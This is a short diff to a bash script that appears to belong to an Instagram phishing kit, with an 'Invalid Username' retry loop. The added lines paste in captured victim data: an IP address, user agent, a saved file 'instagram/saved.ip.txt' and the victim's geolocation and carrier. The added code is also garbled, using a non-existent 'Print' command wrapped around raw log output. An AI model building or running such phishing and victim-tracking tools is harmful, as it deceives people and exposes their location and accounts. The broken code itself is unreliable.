@@ -65,3 +65,15 @@ printf "\e[1;91mInvalid Username! Try again\e[0m\n"
 sleep 1
 start
 else
+Print "Victim IP: 106.210.49.22
+[*] User-Agent:  User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; unknown device) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36
+[*] Saved: instagram/saved.ip.txt
+
+[*] Hostname: 106.210.49.22
+[*] IP Continent: Asia (AS)
+[*] IP Country:  India
+[*] State: Delhi
+[*] City Location: Delhi
+[*] AS Number: AS45609 Bharti Airtel Ltd. AS for GPRS Service
+[*] IP Address Speed: Mobile/Cellular Internet Speed
+[*] IP Currency: Indian rupee (INR)"
